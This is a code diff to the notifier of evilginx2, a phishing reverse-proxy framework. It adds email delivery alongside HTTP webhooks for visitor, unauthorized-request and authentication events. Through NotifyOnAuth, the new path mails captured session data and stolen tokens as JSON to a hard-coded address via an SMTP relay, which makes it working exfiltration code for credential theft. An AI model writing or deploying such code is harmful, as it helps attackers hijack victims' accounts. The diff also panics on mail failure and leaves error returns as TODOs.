@@ -8,7 +8,10 @@ import (
 	"net/url"
 	"time"
 
+	"gopkg.in/gomail.v2"
+
 	"github.com/kgretzky/evilginx2/database"
+	"github.com/kgretzky/evilginx2/log"
 )
 
 type Unauthorized struct {
@@ -43,25 +46,53 @@ func NotifyReturnReq(n *Notify, body interface{}) (req http.Request, err error) 
 
 // configures and sends the http.Request
 func NotifierSend(n *Notify, body interface{}) error {
-	req, err := NotifyReturnReq(n, body)
-	if err != nil {
-		return err
+	log.Debug("Starting NotifierSend")
+
+	switch n.Method {
+
+	case "GET", "POST":
+		req, err := NotifyReturnReq(n, body)
+		if err != nil {
+			return err
+		}
+
+		if n.AuthHeaderName != "" && n.AuthHeaderValue != "" {
+			req.Header.Add(n.AuthHeaderName, n.AuthHeaderValue)
+		}
+
+		if n.BasicAuthUser != "" && n.BasicAuthPassword != "" {
+			req.SetBasicAuth(n.BasicAuthUser, n.BasicAuthPassword)
+		}
+
+		client := &http.Client{Timeout: 10 * time.Second}
+		_, errreq := client.Do(&req)
+		if errreq != nil {
+			return errreq
+		}
+		return nil
+
+	case "E-Mail":
+		bodymarshaldjson, _ := json.Marshal(body)
+		bodystr := string(bodymarshaldjson)
+
+		// TODO create vairables for all of this?
+		m := gomail.NewMessage()
+		m.SetHeader("From", "phishing-notification@xxx.xxx.de")
+		m.SetHeader("To", "xxx@xxx.de")
+		m.SetHeader("Subject", "Evilginx2 Notification")
+		m.SetBody("text/plain", bodystr)
+
+		d := gomail.Dialer{Host: "relay", Port: 587}
+		log.Debug("Mail Notification sent")
+
+		if err := d.DialAndSend(m); err != nil {
+			log.Error("Notifier E-Mail failed. Panic")
+			panic(err)
+		}
+		return nil
 	}
 
-	if n.AuthHeaderName != "" && n.AuthHeaderValue != "" {
-		req.Header.Add(n.AuthHeaderName, n.AuthHeaderValue)
-	}
-
-	if n.BasicAuthUser != "" && n.BasicAuthPassword != "" {
-		req.SetBasicAuth(n.BasicAuthUser, n.BasicAuthPassword)
-	}
-
-	client := &http.Client{Timeout: 10 * time.Second}
-	_, errreq := client.Do(&req)
-	if errreq != nil {
-		return errreq
-	}
-	return nil
+	return nil //TODO return err
 }
 
 // prepares the Body for unauthorized requests and triggers NotifierSend
@@ -72,6 +103,8 @@ func NotifyOnUnauthorized(n *Notify, pl_name string, req_url string, useragent s
 		Useragent:   useragent,
 		Remote_addr: remote_addr,
 	}
+
+	log.Debug("Starting NotifyOnUnauthorized")
 
 	err := NotifierSend(n, b)
 	if err != nil {
@@ -86,6 +119,8 @@ func NotifyOnVisitor(n *Notify, session database.Session, url *url.URL) error {
 	b := Visitor{
 		Session: s,
 	}
+
+	log.Debug("Starting NotifyOnVisitor")
 
 	query := url.Query()
 	if n.ForwardParam != "" && query[n.ForwardParam] != nil {
@@ -107,6 +142,9 @@ func NotifyOnAuth(n *Notify, session database.Session, phishlet *Phishlet) error
 		Session: s,
 		Tokens:  tokensToJSON(&p, s.Tokens),
 	}
+	//TODO option to not send sensitive data by mail
+
+	log.Debug("Starting NotifyOnAuth")
 
 	err := NotifierSend(n, b)
 	if err != nil {
